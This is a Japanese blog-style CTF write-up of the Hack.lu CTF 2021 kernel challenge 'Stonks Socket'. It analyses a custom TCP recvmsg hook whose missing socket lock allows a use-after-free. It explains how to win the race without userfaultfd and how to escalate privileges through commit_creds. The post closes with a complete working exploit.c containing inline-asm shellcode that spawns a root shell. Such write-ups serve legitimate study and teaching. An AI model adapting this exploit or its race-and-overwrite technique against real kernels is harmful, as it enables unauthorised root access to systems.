@@ -1,0 +1,395 @@
+<p>
+<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script>
+</p>
+<div class="keywords"><span class="btitle">keywords</span>
+<p>kernel exploit / race w/o uffd / shellcode</p>
+</div>
+<!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<p> </p>
+<h3>1: イントロ</h3>
+<p> </p>
+<p>最近はどうも気分が沈みがちで、そんな楽しくない日々を送っております。こんにちは、ニートです。</p>
+<p>いつぞや開催された <strong>Hack.lu CTF 2021</strong> 。そのkernel問題である <strong>Stonks Socket</strong> を解いていきます。しんどいときには破壊と切り捨てと放置と放棄が大事です。</p>
+<p> </p>
+<h3>2: overview / analysis</h3>
+<p> </p>
+<h4>static</h4>
+<p>リシテア曰く:</p>
+<div style="margin-bottom: 0; padding-bottom: 0; display: inline; font-size: 80%; background-color: #3d3939;">lysithea-analysis.sh</div>
+<pre class="prettyprint linenums lang-sh">===============================
+Drothea v1.0.0
+[.] kernel version:
+  Linux version 5.11.0-38-generic (buildd@lgw01-amd64-041) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #1
+[!] mmap_min_addr is smaller than 4096: 65536
+[!] Oops doesn't mean panic.
+  you mignt be able to leak info by invoking crash.
+[!] SMEP is disabled.
+[!] SMAP is disabled.
+[!] unprivileged ebpf installation is enabled.
+[-] unprivileged userfaultfd is disabled.
+[?] KASLR seems enabled. Should turn off for debug purpose.
+[?] kptr seems restricted. Should try 'echo 0 &gt; /proc/sys/kernel/kptr_restrict' in init script.
+Ingrid v1.0.0
+[.] userfaultfd is not disabled.
+[-] CONFIG_STRICT_DEVMEM is enabled.
+===============================
+</pre>
+<p> </p>
+<p>まず、SMEP/SMAP無効でKASLR有効なのは良い。ついでにOopsでleakできるのもいい(但し今回の問題はshellをくれるのではなくバイナリをアップロードして勝手に実行される形式だった。けど、その中でシェル開けばいいだけだから、なんでこの形式かはわからんかった)。問題は、<code>userfaultfd</code>が、実装こそされているものの<code>unprivileged_userfaultfd</code>が禁止されていると言っている。めんど。これは持論なんですが、どうせレースが解法で且つ相当巧妙なタイミング操作が問題の肝とかでも無い限り、uffdを殺すのは悪だと思っています。めんどいだけなので。まぁ、ソースを配布しているから全部許します。ソース無配布&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;深夜2時にどんちゃん騒ぎする上階のカス住人&gt;&gt;&gt;&gt;uffd殺しのorderで悪です。</p>
+<p> </p>
+<h4>module overview</h4>
+<p>TCPプロトコルソケットの<code>ioctl</code>実装をオレオレ<code>ioctl</code>に置き換えている(厳密には、内部で<code>super</code>しているため置き換えていると言うよりもプリフックしている)。</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="installation of the module">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20211202/20211202162230.png" alt="f:id:smallkirby:20211202162230p:plain" width="540" height="217" loading="lazy" title="" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">installation of the module</figcaption>
+</figure>
+<p>本モジュールはソケットから<code>recvmsg()</code>する際に、メッセージのハッシュをバッファ末尾に付与するというのがメイン機能になっている。その実現のため、<code>recvmsg()</code>自体をカスタムのものに置き換えている。</p>
+<div style="margin-bottom: 0; padding-bottom: 0; display: inline; font-size: 80%; background-color: #3d3939;">stonks_ioctl.c</div>
+<pre class="prettyprint linenums lang-c">int stonks_ioctl(struct sock *sk, int cmd, unsigned long arg) {
+    int err;
+    u64 *sks = (u64*)sk;
+    ...
+    if (cmd == OPTION_CALL) { 
+    ...
+    sk-&gt;sk_user_data = stonks_sk;
+    // replace `recvmsg` function with custom one
+    sk-&gt;sk_prot-&gt;recvmsg = stonks_rocket;
+    return err;
+    ...
+</pre>
+<p>こいつの実装はこんな感じで、内部で本来の<code>tcp_recvmsg()</code>を呼びつつ、その後に独自の<code>hash_function()</code>でハッシュを生成してメッセージバッファに入れている。わざわざ関数ポインタ使ってるね、怪しいね。一応建前はハッシュ関数を選択できるようにらしいけどね。うん。</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="hook of &#96;tcp_recvmsg()&#96;">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20211202/20211202162251.png" alt="f:id:smallkirby:20211202162251p:plain" width="792" height="392" loading="lazy" title="" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">hook of `tcp_recvmsg()`</figcaption>
+</figure>
+<p> </p>
+<p>ハッシュ関数はこんな感じ。ソケットに入ってきたメッセージを、ユーザが指定した<code>length</code> qword毎に区切ってバッファに入れて、どんどんXORしていく簡単な実装。</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="impl of hash function">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20211202/20211202162313.png" alt="f:id:smallkirby:20211202162313p:plain" width="421" height="478" loading="lazy" title="" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">impl of hash function</figcaption>
+</figure>
+<p> </p>
+<p>お試しで以下のコードを実行すると、ちゃんと末尾にハッシュっぽいのが付与されているのが分かる。</p>
+<p> </p>
+<div style="margin-bottom: 0; padding-bottom: 0; display: inline; font-size: 80%; background-color: #3d3939;">test.c</div>
+<pre class="prettyprint linenums lang-c">  // write to socket from client
+  write(csock, "ABCDEFG", 8);
+  option_arg_t option = {
+    .size = 0x4,
+    .rounds = 1,
+    .key = 0xdeadbeef,
+    .security = 1,
+  };
+  assert(ioctl(psock, OPTION_CALL, &amp;option) == 0);
+  char bbuf[0x30] = {0};
+  recv(psock, bbuf, 0x30, 0);
+  puts("[.] received");
+  printf("%s\n", bbuf);
+  hexdump(bbuf, 0x30);
+}
+</pre>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="test">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20211202/20211202162332.png" alt="f:id:smallkirby:20211202162332p:plain" width="256" height="197" loading="lazy" title="" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">test</figcaption>
+</figure>
+<p> </p>
+<h3>3: vulns</h3>
+<p>まぁ全体的にバギーなプログラムではある。<code>length</code>をいじることで<code>secure_hash()</code>でスタックが溢れるうえに、oopsがpanicではないから敢えてoopsさせてleakさせるのもできる。他にも適当にモンキーテストしてたら簡単にクラッシュするパスも見つかったが、大して使えそうにはなかったため忘れてしまった。</p>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="leak via oops">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20211202/20211202162401.png" alt="f:id:smallkirby:20211202162401p:plain" width="1053" height="653" loading="lazy" title="" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">leak via oops</figcaption>
+</figure>
+<p>一番の問題は、<code>struct sock</code>のロックを取っていないこと。本来の実装である<code>tcp_recvmsg()</code>では、内部関数を呼ぶ前にちゃんと　ソケットのロックを取っている。</p>
+<div style="margin-bottom: 0; padding-bottom: 0; display: inline; font-size: 80%; background-color: #3d3939;">net/ipv4/tcp.c</div>
+<pre class="prettyprint linenums lang-c">int tcp_recvmsg(struct sock *sk, struct msghdr *msg, size_t len, int nonblock,
+		int flags, int *addr_len)
+{
+    ...
+	lock_sock(sk);
+	ret = tcp_recvmsg_locked(sk, msg, len, nonblock, flags, &amp;tss,
+				 &amp;cmsg_flags);
+	release_sock(sk);
+    ...
+}
+EXPORT_SYMBOL(tcp_recvmsg);
+</pre>
+<p> </p>
+<p>だが、本モジュールではあろうことか<code>sk-&gt;sk_user_data</code>をスタックに積んでロックもとらず放置してしまっている。いわゆるパッチ問(この問題もフックをつけてるだけだからある種のパッチ問だと思う)においては、本来の実装と違うところがバグである。</p>
+<p>この<code>sk_user_data</code>には、先程言ったハッシュを生成するためのユーザ指定の情報(関数ポインタのみユーザ指定不可)が入っており、<code>tcp_recvmsg()</code>後にスタックに積んだ<code>sk_user_data</code>から情報を取り出して使っている。このデータは<code>ioctl</code>で<code>kfree</code>できるため、無事にUAF完成。</p>
+<p> </p>
+<p> </p>
+<h3>4: race</h3>
+<p>さてさて、最初に書いたように<code>unprivileged_userfualtfd</code>が禁止されている。よって、結構シビアなレースをする必要が有る。最初は<code>sendmsg</code>で任意サイズのsprayをしようとしていたが、<code>sendmsg</code>でのspray、一回も成功したこと無くて断念した。これ、ほんとに使える???</p>
+<p>こういう場合に安定なのは、モジュール内で実装されている関数・構造体をレースに使うこと。victimとなる構造体は<code>struct StonksSocket</code>で、サイズは<code>0x20</code>。</p>
+<p> </p>
+<p>まず、クライアント1(victim)のソケットを開いて<code>ioctl</code>して<code>StonksSocket</code>を作る。次に、同一サーバに対してクライアント2(attacker)のソケットを作り、同様に<code>ioctl</code>して<code>StonksSocket</code>を作り、先にクソデカメッセージを送っておく。まだ<code>recv</code>はしない。</p>
+<p>ここでスレッドを他に2つ作る。receiverスレッドでは、起動と同時にvictimの<code>StonksSocket</code>を削除して、その後attackerから永遠に<code>recv</code>し続ける。</p>
+<div style="margin-bottom: 0; padding-bottom: 0; display: inline; font-size: 80%; background-color: #3d3939;">receiver.c</div>
+<pre class="prettyprint linenums lang-c">static void *receiver(void *arg) {
+  puts("[+] receiver thread started");
+  while(GO == 0);
+  ioctl(victim_sock_fd, OPTION_PUT, NULL);
+  while(1 == 1) {
+    recv(attacker_sock_fd, bigrcvbuf, BIGSIZE, 0);
+  }
+  return NULL;
+}
+</pre>
+<p> </p>
+<p>writerスレッドでは、一度だけvictimに対して<code>write</code>をする。このデータはなんでもいい。</p>
+<div style="margin-bottom: 0; padding-bottom: 0; display: inline; font-size: 80%; background-color: #3d3939;">writer.c</div>
+<pre class="prettyprint linenums lang-c">static void *writer(void *arg) {
+  puts("[+] writer thread started");
+  usleep(1500 * 1000);
+  GO=1;
+  for (int ix = 0; ix != 30; ++ix) {
+    usleep(1);
+  }
+  write(victim_socket, bigbuf, 8);
+}
+</pre>
+<p> </p>
+<p>最後に、メインスレッドでは一度だけvictimから<code>read</code>する。</p>
+<p> </p>
+<p>これらがうまく噛み合って以下の順で起こると、レースが起こる:</p>
+<p>1. メインスレッドがvictimからreadする。<code>stonks_rocket()</code>内で、<code>sk_user_data</code>ポインタをスタックに積む。読むのはクソデカバッファだから、<code>tcp_recvmsg()</code>内でコンテキストスイッチする(しろ)。</p>
+<p>2. readerスレッドがvictimの<code>StonksSocket</code>を<code>kfree</code>する。これでvictimのスタックに乗っている<code>sk_user_data</code>はダングリング。</p>
+<p>3. readerスレッド内でattackerから<code>recv</code>することで、<code>secure_hash</code>内の以下のパスで、victimがリリースした直後の0x20サイズのチャンク(<code>StonksSocket</code>)がとられ、kUAF(overwrite)。</p>
+<div style="margin-bottom: 0; padding-bottom: 0; display: inline; font-size: 80%; background-color: #3d3939;">.c</div>
+<pre class="prettyprint linenums lang-c">    while (i) {
+        size = h-&gt;length * sizeof(u64);
+        buf = kmalloc(size, GFP_KERNEL);
+        i = copy_from_iter(buf, size, msg);
+        for (j = 0; j &lt; i; j++) {
+            hash[j] ^= buf[j];
+        }
+        kfree(buf);
+    }
+</pre>
+<p>4. writerスレッド内でvictimにwriteすることで、メインスレッドの<code>recv</code>の処理が続行する。このときには、3により<code>sk_user_data-&gt;hash_function</code>関数ポインタがattackerにより送られたメッセージの値で上書きされている。</p>
+<p>5. メインスレッド内の<code>recv</code>が、通常の<code>tcp_recvmsg()</code>を終えて書き換えられたハッシュ関数を呼び出す。</p>
+<p>6. nirugiri</p>
+<p> </p>
+<p> </p>
+<p>かなり調整がシビアで、writerスレッドとメインスレッドでスリープを挟んで微調整をしながら上手くいかないなぁと嘆いていたけど、 <span style="font-size: 200%;"><strong>クソデカバッファのサイズをクソデカからクソデカデカデカデカにしたら上手くいった</strong> 。</span>力こそ正義。</p>
+<p> </p>
+<p> </p>
+<h3>5: LPE</h3>
+<p> </p>
+<p>SMEPもSMAPも無効だから、RIPを取ればもう終わり。RIPが取れた時のスタックを眺めて、使えそうなシンボルをスタックから見繕って<code>commit(kpc(0))</code>した。</p>
+<p> </p>
+<p> </p>
+<h3>6: exploit</h3>
+<p> </p>
+<div style="margin-bottom: 0; padding-bottom: 0; display: inline; font-size: 80%; background-color: #3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">// for exploit.h, refer to https://github.com/smallkirby/lysithea
+
+#include "exploit.h"
+#include &lt;sched.h&gt;
+
+/*********** commands ******************/
+
+#define DEV_PATH ""   // the path the device is placed
+#define u64 ulong
+typedef union {
+    // for OPTION_DEBUG
+    struct {
+        u64 off;
+        u64 *data;
+    };
+    // for OPTION_CALL
+    struct {
+        unsigned size;
+        u64 rounds;
+        u64 key;
+        u64 security;
+    };
+} option_arg_t;
+
+#define OPTION_CALL     0x1337
+#define OPTION_PUT      0x1338
+#define OPTION_DEBUG    0x1339
+
+/*********** constants ******************/
+
+#define PORT 49494
+#define BIGSIZE 0x80000
+int victim_sock_fd = -1, attacker_sock_fd = -1;
+int victim_socket, attacker_socket;
+char bigbuf[BIGSIZE] = {0};
+char bigrcvbuf[BIGSIZE] = {0};
+const option_arg_t call_option_security = {
+    .size = 0x4,
+    .rounds = 1,
+    .key = 0xdeadbeef,
+    .security = 1,
+};
+const option_arg_t call_option_empty = {
+    .size = 0x4,
+    .rounds = 1,
+    .key = 0xdeadbeef,
+    .security = 0,
+};
+int GO = 0;
+
+/****** (END constants) *****************/
+
+#define DIFF_PREPARE_KERNEL_CRED 0x38f4b
+#define DIFF_COMMIT_CREDS 0x3944b
+
+void nirugiri()
+{
+  asm(
+    "mov rax, [rsp+0x28]\n"
+    "sub rax, 0x38f4b\n"
+    "xor rdi, rdi\n"
+    "call rax\n"
+    "mov rdi, rax\n"
+    "mov rax, [rsp+0x28]\n"
+    "sub rax, 0x3944b\n"
+    "call rax\n"
+    //"mov rax, [0xaaa]\n" // PROBE
+    "leave\n"
+    "ret\n"
+  );
+}
+
+
+int listenat(int port) {
+  printf("[.] creating listening socket @ %d ...\n", port);
+  int sock = socket(AF_INET, SOCK_STREAM, 0);
+  assert(sock != -1);
+  struct sockaddr_in addr;
+  memset(&amp;addr, 0, sizeof(addr));
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(port);
+  addr.sin_addr.s_addr = htonl(INADDR_ANY);
+  assert(bind(sock, (struct sockaddr*)&amp;addr, sizeof(addr)) != -1);
+  assert(listen(sock, 999) == 0);
+
+  return sock;
+}
+
+int connectto(int port) {
+  puts("[.] creating client socket");
+  int csock = socket(AF_INET, SOCK_STREAM, 0);
+  assert(csock != -1);
+  struct sockaddr_in caddr;
+  memset(&amp;caddr, 0, sizeof(caddr));
+  caddr.sin_family = AF_INET;
+  caddr.sin_port = htons(port);
+  caddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+  assert(connect(csock, &amp;caddr, sizeof(caddr)) == 0);
+
+  return csock;
+}
+
+static void *receiver(void *arg) {
+  puts("[+] receiver thread started");
+  while(GO == 0);
+  ioctl(victim_sock_fd, OPTION_PUT, NULL);
+  while(1 == 1) {
+    recv(attacker_sock_fd, bigrcvbuf, BIGSIZE, 0);
+  }
+  return NULL;
+}
+
+static void *writer(void *arg) {
+  puts("[+] writer thread started");
+  usleep(1500 * 1000);
+  GO=1;
+  for (int ix = 0; ix != 30; ++ix) {
+    usleep(1);
+  }
+  write(victim_socket, bigbuf, 8);
+}
+
+int main(int argc, char *argv[]) {
+  puts("[.] exploit started.");
+  printf("[+] nirugiri @ %p\n", nirugiri);
+
+  // create receiver socket
+  int server_socket = listenat(PORT);
+  struct sockaddr peer_addr;
+  unsigned len = sizeof(peer_addr);
+
+  // connect to the socket
+  puts("[+] requesting connection");
+  victim_socket = connectto(PORT);
+  attacker_socket = connectto(PORT);
+
+  // accept victim and set hash filter
+  puts("[+] accepting victim connection");
+  assert((victim_sock_fd = accept(server_socket, &amp;peer_addr, &amp;len)) != -1);
+  assert(ioctl(victim_sock_fd, OPTION_CALL, &amp;call_option_empty) == 0);
+
+  // accept attacker connection and set evil hash filter
+  puts("[+] accepting attacker connection and setting hashes");
+  for (int ix = 0; ix != BIGSIZE / 8; ++ix) {
+    ((ulong*)bigbuf)[ix] = (ulong)nirugiri;
+  }
+  assert((attacker_sock_fd = accept(server_socket, &amp;peer_addr, &amp;len)) != -1);
+  assert(ioctl(attacker_sock_fd, OPTION_CALL, &amp;call_option_security) == 0);
+  assert(write(attacker_socket, bigbuf, BIGSIZE) != -1);
+
+  /*** invoke race ***
+  * the main point is, operations is done in exact order below;
+  *
+  * 1. victim recv() start, which takes much time to read huge buf
+  * 2. attacker StonksSocket is put
+  * 3. attacker recv() is done, which means overwrite of victim Socket
+  * 4. end reading of victim buf, which leads to hash_function(), in this case nirugiri()
+  ***/
+  puts("[+] starting race...");
+  pthread_t receiver_thr, writer_thr;
+  pthread_create(&amp;receiver_thr, NULL, receiver, NULL);
+  pthread_create(&amp;writer_thr, NULL, writer, NULL);
+  for (int ix = 0; ix != 100; ++ix) {
+    usleep(50);
+  }
+  recv(victim_sock_fd, bigrcvbuf, 0x100, 0);
+
+  sleep(1);
+  if (getuid() != 0) {
+    puts("\n[FAIL] couldn't get root...");
+    exit(1);
+  } else {
+    puts("\n\n[SUCCESS] enjoy your root.");
+    system("/bin/sh");
+  }
+
+  // end of life (UNREACHABLE)
+  puts("[ ] END of life...");
+  sleep(9999);
+}
+</pre>
+<p> </p>
+<p> </p>
+<h3>7: アウトロ</h3>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title="exploit">
+<p><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20211202/20211202162638.png" alt="f:id:smallkirby:20211202162638p:plain" width="602" height="562" loading="lazy" title="" class="hatena-fotolife" itemprop="image" /></p>
+<figcaption class="mceEditable">exploit</figcaption>
+</figure>
+<p>uffd殺さなくても良かったんじゃないでしょうか。</p>
+<p> </p>
+<p> </p>
+<p>早く大学4年が終わってほしみが深くてぴえん超えてぱおんです。風花雪月は4周目がそろそろ終わります。</p>
+<p> </p>
+<p> </p>
+<h3>8: 参考</h3>
+<p>1: kernelpwn</p>
+<p><a href="https://github.com/smallkirby/kernelpwn">https://github.com/smallkirby/kernelpwn</a></p>
+<p>2: lysithea</p>
+<p><a href="https://github.com/smallkirby/lysithea">https://github.com/smallkirby/lysithea</a></p>
+<p>3: ニルギリ</p>
+<p><a href="https://youtu.be/yvUvamhYPHw">https://youtu.be/yvUvamhYPHw</a></p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p>続く...</p>
+<p> </p>
+<p> </p>
